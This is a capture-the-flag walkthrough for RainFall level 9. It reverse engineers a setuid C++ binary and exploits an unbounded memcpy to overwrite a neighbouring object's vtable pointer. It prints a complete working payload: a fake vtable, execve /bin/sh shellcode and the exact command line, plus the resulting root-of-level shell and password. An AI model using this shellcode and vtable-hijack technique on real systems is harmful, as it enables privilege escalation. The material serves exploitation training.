# Level 9 - C++ Vtable Exploitation Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level9@RainFall:~$ ls -la
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$ file level9
level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4274e0b3b90d0b2e4a586e20a97f6c6b5e1a9a0b, not stripped
```
**Key observations:**

- setuid and setgid binary (s flags in permissions)

- Owned by bonus0 user (next level)

- When executed, runs with bonus0 privileges

### 2. Test Basic Execution
```bash
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 test
level9@RainFall:~$ ./level9 test test
```
**Observations:**

- Program takes one argument (argv[1])

- No output, no obvious behavior

- Must be reverse engineered to understand functionality

## Reverse Engineering - C++ Binary Analysis
### 3. Function Analysis
```bash
level9@RainFall:~$ gdb level9
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080484b0  __cxa_atexit@plt
0x080484d0  std::ios_base::Init::Init()@plt
0x080484f0  _exit@plt
0x08048500  std::ios_base::Init::~Init()@plt
0x08048510  memcpy@plt
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)@plt
0x080485f4  main
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```
**Critical Discovery:**

- This is a C++ binary (first in the Rainfall series)

- Class N with constructor, methods, and operator overloads

- operator new used instead of malloc

- memcpy function available - potential vulnerability

## 4. Disassembling Main - Understanding Object Creation
```bash
(gdb) disas main
assembly
0x08048617: call   0x8048530 <_Znwj@plt>    # operator new(108) - first object
0x08048629: call   0x80486f6 <_ZN1NC2Ei>    # N::N(5) constructor
0x0804862e: mov    %ebx,0x1c(%esp)          # Store first object pointer

0x08048639: call   0x8048530 <_Znwj@plt>    # operator new(108) - second object
0x0804864b: call   0x80486f6 <_ZN1NC2Ei>    # N::N(6) constructor
0x08048650: mov    %ebx,0x18(%esp)          # Store second object pointer

0x08048677: call   0x804870e <_ZN1N13setAnnotationEPc>  # N::setAnnotation(argv[1])

0x08048693: call   *%edx                     # Virtual function call! ⭐
```
**Program Flow:**

- Creates first N object with value 5

- Creates second N object with value 6

- Calls setAnnotation on first object with argv[1]

- Calls a virtual function on second object

## 5. Analyzing the N Class
- Constructor N::N(int):

```assembly
0x080486f6: push   %ebp
0x080486f7: mov    %esp,%ebp
0x080486f9: mov    0x8(%ebp),%eax           # this pointer
0x080486fc: movl   $0x8048848,(%eax)        # Store vtable pointer! ⭐
0x08048702: mov    0xc(%ebp),%edx            # Value parameter
0x08048705: mov    %edx,0x4(%eax)            # Store value in member
0x08048708: pop    %ebp
0x08048709: ret
```
**Class Layout Discovery:**

- Vtable pointer at offset 0: Points to 0x8048848

- Member variable at offset 4: Stores the integer value

- Total object size: 108 bytes (0x6c)

## 6. Examining the Vtable
```bash
(gdb) x/4x 0x8048848
0x8048848:    0x0804873a    0x0804874e    0x00000000    0x00000000
(gdb) x 0x0804873a
0x804873a <_ZN1NplER1S>: 0x83e58955  # N::operator+
(gdb) x 0x0804874e
0x804874e <_ZN1NmiER1S>: 0x83e58955  # N::operator-
```
**Vtable Structure:**

- Offset +0: N::operator+ (0x0804873a)

- Offset +4: N::operator- (0x0804874e)

- Rest are zero (other virtual functions?)

## 7. Analyzing N::setAnnotation - The Vulnerability
```bash
(gdb) disas 0x804870e
assembly
0x0804870e: push   %ebp
0x0804870f: mov    %esp,%ebp
0x08048711: sub    $0x18,%esp
0x08048714: mov    0x8(%ebp),%eax           # this pointer
0x08048717: mov    %eax,-0x8(%ebp)          # Store this
0x0804871a: mov    0xc(%ebp),%eax           # argv[1] string
0x0804871d: mov    %eax,(%esp)
0x08048720: call   0x8048520 <strlen@plt>   # Get string length
0x08048725: lea    0x4(%eax),%edx           # length + 4
0x08048728: mov    -0x8(%ebp),%eax
0x0804872b: lea    0x4(%eax),%ecx           # destination = this + 4 (after vtable)
0x0804872e: mov    0xc(%ebp),%eax           # source string
0x08048731: mov    %edx,0x8(%esp)           # size = strlen(str) + 4
0x08048735: mov    %eax,0x4(%esp)           # source
0x08048739: mov    %ecx,(%esp)              # destination
0x0804873c: call   0x8048510 <memcpy@plt>   # COPY WITHOUT BOUNDS CHECK! ⭐
0x08048741: leave
0x08048742: ret
```
**Critical Vulnerability:**

- memcpy(dest, src, strlen(src) + 4) where dest is this + 4

- The object is only 108 bytes total

- No bounds checking! We can overflow beyond the object

### 8. Understanding the Exploitation Vector
- The virtual call at the end of main:

```assembly
0x0804867c: mov    0x10(%esp),%eax     # eax = second object pointer
0x08048680: mov    (%eax),%eax         # dereference to get vtable pointer
0x08048682: mov    (%eax),%edx         # dereference to get first vtable entry
0x08048693: call   *%edx               # call it!
```
**Double Dereference:**

- First dereference: object ptr → vtable ptr

- Second dereference: vtable ptr → function ptr

- Then call that function

- Exploit Goal: Control this execution flow to run shellcode

- Exploitation Strategy
### 9. Finding the Overflow Offset
**Using a De Bruijn pattern to find exactly where we control the second object's vtable:**

```bash
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441       1094083649
```
**Pattern Analysis:**

- 0x41366441 = "Ad6A" in ASCII

- This appears at position 108 in the pattern

- Offset = 108 bytes to reach the vtable pointer of the second object

### 10. Memory Layout Visualization
```text
Heap layout after allocations:

First object (0x804a008):    Second object (0x804a078):
┌─────────────────────┐      ┌─────────────────────┐
│ vtable ptr (4)      │      │ vtable ptr (4)      │
│ 0x8048848           │      │ 0x8048848           │
├─────────────────────┤      ├─────────────────────┤
│ member int (4)      │      │ member int (4)      │
│ 5                   │      │ 6                   │
├─────────────────────┤      ├─────────────────────┤
│                     │      │                     │
│ annotation buffer   │      │ annotation buffer   │
│ (remaining 100 bytes│      │ (unused initially)  │
│ for setAnnotation)  │      │                     │
└─────────────────────┘      └─────────────────────┘
    0x804a00c                   0x804a07c
    (start of buffer)           (vtable ptr location)
          ↑                            ↑
    Our input writes              Target to overwrite
    starting here                  (108 bytes offset)
```
## 11. The Exploit Design
**We need to:**

- Place shellcode in the first object's buffer

- Create a fake vtable that points to our shellcode

- Overflow into second object to make its vtable point to our fake vtable

- Ensure the double dereference lands in our shellcode

- Fake vtable strategy:

- First object's buffer starts at 0x804a00c

- We'll put a fake vtable pointer at this address pointing to 0x804a010

- Then our shellcode starts at 0x804a010

**Double dereference flow:**

```text
Second object's vtable (overwritten) → 0x804a00c (fake vtable)
0x804a00c contains → 0x804a010 (shellcode start)
0x804a010 contains → shellcode instructions
```
### 12. Finding Buffer Addresses
```bash
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141        # First object's buffer starts here
Key addresses:

Buffer start: 0x804a00c

Shellcode start: 0x804a010 (buffer + 4)

Fake vtable location: 0x804a00c (points to shellcode)

Second object's vtable location: 0x804a07c (buffer + 108)
```
### 13. Crafting the Shellcode
***Using 28-byte execve shellcode (no NULL bytes):**

```assembly
\x31\xc0        xor    %eax, %eax          ; Zero eax
\x50            push   %eax                 ; Push NULL terminator
\x68\x2f\x2f\x73\x68 push  $0x68732f2f      ; Push "//sh"
\x68\x2f\x62\x69\x6e push  $0x6e69622f      ; Push "/bin"
\x89\xe3        mov    %esp, %ebx           ; ebx → "/bin//sh"
\x89\xc1        mov    %eax, %ecx           ; ecx = 0 (argv)
\x89\xc2        mov    %eax, %edx           ; edx = 0 (envp)
\xb0\x0b        mov    $0xb, %al            ; syscall 11 (execve)
\xcd\x80        int    $0x80                 ; Call kernel
\x31\xc0        xor    %eax, %eax           ; Zero eax
\x40            inc    %eax                  ; eax = 1 (exit)
\xcd\x80        int    $0x80                 ; Exit cleanly
```
### 14. Building the Final Payload
```text
Payload structure (108 + 4 bytes):

[0-3]    : Fake vtable pointer → 0x804a010 (points to shellcode)
[4-31]   : Shellcode (28 bytes)
[32-107] : Padding (76 bytes of 'A')
[108-111]: Overwrite second object's vtable → 0x804a00c
Python payload:

python
python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"'
```
### 15. Executing the Exploit
```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ exit
```
## Exploit Visualization
**Memory State After Overflow:**

```text
Address:    0x804a00c    0x804a010             0x804a04c    0x804a07c
           ┌──────────┬──────────┬───┬──────────┬──────────┬──────────┐
Content:   │0x804a010 │ shellcode│...│   'A'*76 │0x804a00c  │
           └──────────┴──────────┴───┴──────────┴──────────┴──────────┘
           └─┬────────┘└─┬──────┘               └─┬────────┘
       fake vtable    shellcode            overwritten vtable
       points here    executes here        points to fake vtable
```
**Execution Flow:**

- Step 1: call *%edx where edx = [second object vtable]
        second object vtable = 0x804a00c (overwritten)

- Step 2: dereference 0x804a00c → contains 0x804a010

- Step 3: dereference 0x804a010 → first 4 bytes of shellcode
        (these bytes are "xor eax, eax" which is harmless as an address)

- Step 4: call that address → jumps to 0x804a010 and executes shellcode!

- Step 5: Shellcode spawns /bin/sh with bonus0 privileges

## Vulnerability Analysis Summary
**Root Cause:**
- C++ object layout: Vtable pointer at offset 0 makes objects vulnerable

- Unbounded memcpy: setAnnotation copies user input +4 without size check

- Heap adjacency: Objects allocated sequentially allowing overflow between them

- Virtual dispatch: Indirect calls through vtable enable control flow hijacking

## Exploitation Technique:
- Class analysis: Mapped N class layout (vtable ptr + member + buffer)

- Offset discovery: Found 108-byte offset to reach second object's vtable

- Address leakage: Identified buffer start at 0x804a00c

- Fake vtable construction: Placed pointer to shellcode at buffer start

- Shellcode placement: Positioned 28-byte execve shellcode after fake vtable

- Vtable hijacking: Overwrote second object's vtable to point to fake vtable

- Double dereference: Exploited virtual call mechanism to reach shellcode

## Key Learning Points:
- C++-Specific Concepts:

- Vtables: Every polymorphic class has a hidden vtable pointer

- Object layout: Vtable pointer is always at offset 0

- Operator new: C++ wrapper around malloc with same heap behavior

- Virtual calls: Compiled to double dereference of object pointer

## Heap Exploitation:

- Adjacent allocations: malloc places objects consecutively

- Heap overflow: Can corrupt next object's vtable

- Fake vtables: Can point to attacker-controlled memory

## Shellcode Requirements:

- Position independence: Must work anywhere in memory

- No NULL bytes: Avoid string termination

- Small size: Must fit in available buffer (28 bytes worked)

- Modern Mitigations (missing here):

- ASLR: Would randomize heap addresses

- PIE: Would randomize vtable addresses

- RELRO: Could make vtables read-only

- Stack canaries: Would detect overflow (but this is heap)

- CFI: Would validate virtual calls

## Final Exploit Command
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
Password for bonus0: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

- This level demonstrates that C++ introduces new attack surfaces (vtables) while retaining traditional memory corruption vulnerabilities. Understanding object layouts is key to exploiting object-oriented binaries!

